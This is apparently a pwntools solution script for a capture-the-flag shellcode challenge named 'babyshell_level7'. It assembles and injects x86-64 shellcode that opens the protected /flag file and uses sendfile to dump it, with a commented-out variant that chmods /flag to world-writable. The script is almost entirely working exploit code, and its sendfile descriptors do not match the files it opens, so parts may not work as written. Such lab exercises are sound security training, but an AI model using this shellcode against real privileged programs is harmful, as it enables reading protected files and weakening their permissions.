import os

from pwn import *

DEBUG = len(sys.argv) > 1 and sys.argv[1] == 'debug'

bin_path = '/challenge/babyshell_level7'
context.arch = 'amd64'

if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    p = gdb.debug([bin_path])
else:
    p = process([bin_path])

print(p.recvuntil(b'[LEAK]').decode())

# For read
shellcode = f'''
mov rax, 0x{b'/flag'[::-1].hex()}
push rax
mov rdi, rsp
mov rsi, {os.O_RDONLY} 
mov rax, SYS_open
syscall  # open("/flag", O_RDONLY)
mov rbx, rax

mov rax, 0x{b'/tmp/3'[::-1].hex()}
push rax
mov rdi, rsp
mov rsi, {os.O_WRONLY | os.O_CREAT}
mov rdx, {hex(0o666)}
mov rax, SYS_open
syscall  # open("/tmp/3", O_WRONLY, 0o666)

mov rdi, 1
mov rsi, 0
mov rdx, 0
mov r10, 1000
mov rax, SYS_sendfile
syscall  # sendfile(1, 0, 0, 1000)

mov rax, SYS_exit
syscall  # exit()
'''

# shellcode = f'''
# mov rax, 0x{b'/flag'[::-1].hex()}
# push rax
# mov rdi, rsp
# mov rsi, {hex(0o666)} 
# mov rax, SYS_chmod
# syscall  # chmod("/flag", 0o666)

# mov rax, SYS_exit
# syscall
# '''


p.send(asm(shellcode))

time.sleep(1)
print(p.clean())
